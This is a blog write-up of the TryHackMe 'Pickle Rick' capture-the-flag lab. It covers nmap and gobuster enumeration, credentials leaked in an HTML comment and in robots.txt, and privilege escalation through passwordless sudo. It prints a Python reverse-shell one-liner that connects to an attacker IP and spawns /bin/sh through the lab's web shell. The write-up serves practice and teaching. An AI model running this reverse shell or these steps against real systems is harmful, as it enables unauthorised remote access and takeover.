---
title: Pickle Rick - TryHackMe
date: 2022-09-05 19:42:24 +0800
categories: [Blogging, TryHackme]
tags: [writeup]     # TAG names should always be lowercase
---

This **Rick and Morty** themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

![Room Description](/assets/pictures/picklectf/pickledescription.png)
_Room Description_
<br>
## Recon
## Nmap
First I started off by conducting an <code style="color: green;">Nmap</code> scan on the target.
<br>
`$ nmap -sV -p- -vv -oN nmap 10.10.43.157 `
```console
$ nmap -sV -p- -vv -oN nmap 10.10.43.157
Initiating Connect Scan at 21:51
Scanning 10.10.43.157 [65535 ports]
Discovered open port 22/tcp on 10.10.43.157
Discovered open port 80/tcp on 10.10.43.157
```
![Nmap Scan](/assets/pictures/picklectf/nmap.png)
_Nmap Scan_
Let's check **port 80**
## Port 80

![Port 80](/assets/pictures/picklectf/port80.png)
_port 80_
There is nothing interesting here let's try to check the <code style="color: green;">Source Code</code>.
When you inspect the code you will see something very interesting, Saw a comment:
```console
$ curl 10.10.73.218 
...
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```
![Source Code](/assets/pictures/picklectf/sourcecode.png){: .shadow}
_source code inspection_
Now we have a **Username: <code style="color: green;">R1ckRul3s</code>**
<br>
Let's check for more.


![Gobuster](/assets/pictures/picklectf/gobuster.png)
_Gobuster Scan_

![Robots.txt](/assets/pictures/picklectf/wulabl.png)
_Robots.txt Directory_

Found something in this directory: <code style="color: green;">Wubbalubbadubdub</code>.
 This might help us somewhere. 
 <br>
 Let's continue to gather more info about the target.
I did another directory scan with gobuster and found other hidden directories.
``` console
$ gobuster dir -u http://10.10.208.247/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,css,txt,js,sh
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.208.247/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,php,css,txt,js
[+] Timeout:                 10s
===============================================================
2022/09/08 12:07:07 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 315] [--> http://10.10.208.247/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]                    
Progress: 2760 / 1323366 (0.21%) 
```

On the <code style="color: green;">/login.php</code> I found a login page.
![Portal](/assets/pictures/picklectf/portal.png)
_Login Portal_
Let's try to use:
<br>
**Username:** <code style="color: green;">R1ckRul3s</code> 
**Password:** <code style="color: green;">Wubbalubbadubdub</code>


After a successful login, I found a <code style="color: green;">Web shell</code>.
![Web Shell](/assets/pictures/picklectf/webshell.png)
_Web Shell_

I thought of uploading a reverse payload from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a> and listen using <code style="color: green;">pwncat</code>.

```html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.238.145",2001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
## Gain Access
After uploading the payload I received a reverse connection.
![Access](/assets/pictures/picklectf/access.png)
_Gained Access_
```console
(local) pwncat$                                                                                                                                    
(remote) www-data@ip-10-10-252-65:/var/www/html$ ls
Sup3rS3cretPickl3Ingred.txt  assets  clue.txt  denied.php  index.html  login.php  portal.php  robots.txt
(remote) www-data@ip-10-10-252-65:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```
Found the first flag: <code style="color: green;"> mr. meeseek hair</code>
## Priviledge Escalation
I realised `www-data` could run sudo command without password.
![Machine Pwned](/assets/pictures/picklectf/pwned.png)
_Machine Pwned_

## Summary
- From Nmap results, we found that we have 2 open ports:
	- <code style=" color: green;">Port 22 (ssh)</code>
	- <code style=" color: green;">Port 80 (http)</code>
- From <code style="color: green;">Gobuster</code> scan we found a bunch of directories but only two were helpful the others were rabbit holes. The two directories are:
	 - <code style=" color: green;">/robots.txt</code>
	 - <code style=" color: green;">/portal.php</code>
- On the <code style=" color: green;">Portal</code> directory we used <code style=" color: green;">R1ckRul3s</code> as the **username** and <code style=" color: green;">Wubbalubbadubdub</code> as the **password**.
- We uploaded a payload from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a> on the <code style="color: green;">web shell</code>.
- Received a reverse connection to the machine.
- I realised that the user <code style=" color: green;">www-data</code> could run sudo command without password.
- I used <code style=" color: green;">Sudo su</code> to escalate my priviledges to <code style=" color: green;">root</code>.
<br>

That Machine was easy-peasy. It was fun doing the machine. I hope you enjoyed reading through it.
<iframe src="https://giphy.com/embed/d68IdpvmAHohx5NMEV" width="480" height="344" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/moodman-thank-you-thankyou-d68IdpvmAHohx5NMEV"></a></p>
